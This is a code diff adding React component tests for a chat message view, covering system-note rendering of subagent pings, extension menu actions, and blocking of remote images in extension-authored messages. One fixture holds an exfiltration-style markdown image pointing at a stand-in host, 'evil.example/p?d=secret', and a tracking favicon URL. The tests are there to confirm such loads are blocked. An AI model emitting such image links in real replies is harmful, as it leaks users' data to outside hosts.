@@ -2,6 +2,12 @@ import { describe, it, expect, vi } from 'vitest'
 import { render, screen } from '@testing-library/react'
 import { MessageItem } from './MessageItem'
 import type { UIMessage } from 'ai'
+import {
+  ContributionStore,
+  useContributions,
+} from '@/lib/extensions/contributions'
+import { manifest } from '@/lib/extensions/__tests__/fixtures'
+import { toolWireName } from '@/lib/extensions/tools'
 
 vi.mock('@/i18n/react-i18next-compat', () => ({
   useTranslation: () => ({ t: (k: string) => k }),
@@ -63,5 +69,208 @@ describe('what a turn shows besides its messages', () => {
     expect(screen.getByText(/finished/)).toBeInTheDocument()
     // No copy/remember/regenerate: nobody said it, so there is nothing to act on.
     expect(screen.queryByRole('button')).not.toBeInTheDocument()
+  })
+})
+
+describe('a migrated Cowork ping', () => {
+  const PING = '<SYSTEM>\nSubagent researcher (c1) finished.\n</SYSTEM>'
+  // Stored as a user message (the model saw a user turn) and flagged, so the
+  // history replays unchanged while the row shows as a system note.
+  const ping = {
+    id: 'p1',
+    role: 'user',
+    parts: [{ type: 'text', text: PING }],
+    metadata: { systemNotice: true },
+  } as UIMessage
+
+  it('renders through the system-note template, not as a raw <SYSTEM> user bubble', () => {
+    render(
+      <MessageItem
+        message={ping}
+        isFirstMessage={false}
+        isLastMessage={false}
+        status="ready"
+      />
+    )
+    expect(screen.getByText(/Subagent researcher \(c1\) finished\./)).toBeInTheDocument()
+    expect(screen.queryByText(/<SYSTEM>/)).not.toBeInTheDocument()
+    expect(screen.queryByTestId('message-item')).not.toBeInTheDocument()
+    expect(screen.queryByRole('button')).not.toBeInTheDocument()
+  })
+
+  it('looks the same as a native system note', () => {
+    const native = render(
+      <MessageItem
+        message={{ ...ping, id: 'n1', role: 'system', metadata: undefined } as UIMessage}
+        isFirstMessage={false}
+        isLastMessage={false}
+        status="ready"
+      />
+    )
+    const nativeHtml = native.container.innerHTML
+    native.unmount()
+    const flagged = render(
+      <MessageItem
+        message={ping}
+        isFirstMessage={false}
+        isLastMessage={false}
+        status="ready"
+      />
+    )
+    expect(flagged.container.innerHTML).toBe(nativeHtml)
+  })
+
+  it('an ordinary user message that mentions the tag is still a user bubble', () => {
+    render(
+      <MessageItem
+        message={
+          {
+            id: 'u1',
+            role: 'user',
+            parts: [{ type: 'text', text: 'what does <SYSTEM> mean?' }],
+          } as UIMessage
+        }
+        isFirstMessage={false}
+        isLastMessage={false}
+        status="ready"
+      />
+    )
+    expect(screen.getByTestId('message-item')).toBeInTheDocument()
+  })
+})
+
+describe('extension message actions', () => {
+  const reply = {
+    id: 'm2',
+    role: 'assistant',
+    parts: [{ type: 'text', text: 'hi' }],
+  } as UIMessage
+
+  it('offers contributed actions only when the thread is known', () => {
+    const registration = new ContributionStore(
+      useContributions
+    ).registerExtension(
+      manifest('acme.msg', {
+        contributes: {
+          commands: [{ id: 'explain', title: 'Explain' }],
+          menus: { 'message/actions': [{ command: 'explain' }] },
+        },
+      })
+    )
+    try {
+      const { rerender } = render(
+        <MessageItem
+          message={reply}
+          isFirstMessage={false}
+          isLastMessage={false}
+          status="ready"
+        />
+      )
+      expect(screen.queryByLabelText('extensions:moreActions')).toBeNull()
+      rerender(
+        <MessageItem
+          message={reply}
+          isFirstMessage={false}
+          isLastMessage={false}
+          status="ready"
+          threadId="t1"
+        />
+      )
+      expect(screen.getByLabelText('extensions:moreActions')).toBeInTheDocument()
+    } finally {
+      registration.dispose()
+    }
+  })
+})
+
+// janhq/jan-internal#517: a message an extension wrote (or its provider
+// streamed) must not make the app contact any host.
+describe('extension-authored messages', () => {
+  const message = (metadata?: Record<string, unknown>) =>
+    ({
+      id: 'm3',
+      role: 'assistant',
+      metadata,
+      parts: [
+        { type: 'text', text: 'see ![p](https://evil.example/p?d=secret)' },
+        {
+          type: 'file',
+          mediaType: 'image/png',
+          url: 'https://evil.example/f.png',
+        },
+        {
+          type: 'file',
+          mediaType: 'image/png',
+          url: 'data:image/png;base64,iVBORw0KGgo=',
+        },
+      ],
+    }) as UIMessage
+
+  const srcs = (container: HTMLElement) =>
+    Array.from(container.querySelectorAll('img')).map((i) =>
+      i.getAttribute('src')
+    )
+
+  it('loads only inline images', () => {
+    const { container } = render(
+      <MessageItem
+        message={message({ extensionAuthor: 'acme.writer' })}
+        isFirstMessage={false}
+        isLastMessage={false}
+        status="ready"
+      />
+    )
+    expect(srcs(container)).toEqual(['data:image/png;base64,iVBORw0KGgo='])
+  })
+
+  it('leaves other assistant messages as they were', () => {
+    const { container } = render(
+      <MessageItem
+        message={message()}
+        isFirstMessage={false}
+        isLastMessage={false}
+        status="ready"
+      />
+    )
+    expect(srcs(container)).toEqual(
+      expect.arrayContaining([
+        'https://evil.example/p?d=secret',
+        'https://evil.example/f.png',
+      ])
+    )
+  })
+})
+
+describe('citations from extension tools', () => {
+  const wire = toolWireName('acme.search', 'search')
+  const output = JSON.stringify({
+    results: [{ url: 'https://a.example/', favicon: 'https://evil.example/t' }],
+  })
+
+  it('never fetches a favicon, even in a built-in model reply', () => {
+    const { container } = render(
+      <MessageItem
+        message={
+          {
+            id: 'm4',
+            role: 'assistant',
+            parts: [
+              {
+                type: `tool-${wire}`,
+                toolCallId: 'c1',
+                state: 'output-available',
+                input: {},
+                output,
+              } as never,
+              { type: 'text', text: 'done' },
+            ],
+          } as UIMessage
+        }
+        isFirstMessage={false}
+        isLastMessage={false}
+        status="ready"
+      />
+    )
+    expect(container.querySelector('img')).toBeNull()
   })
 })
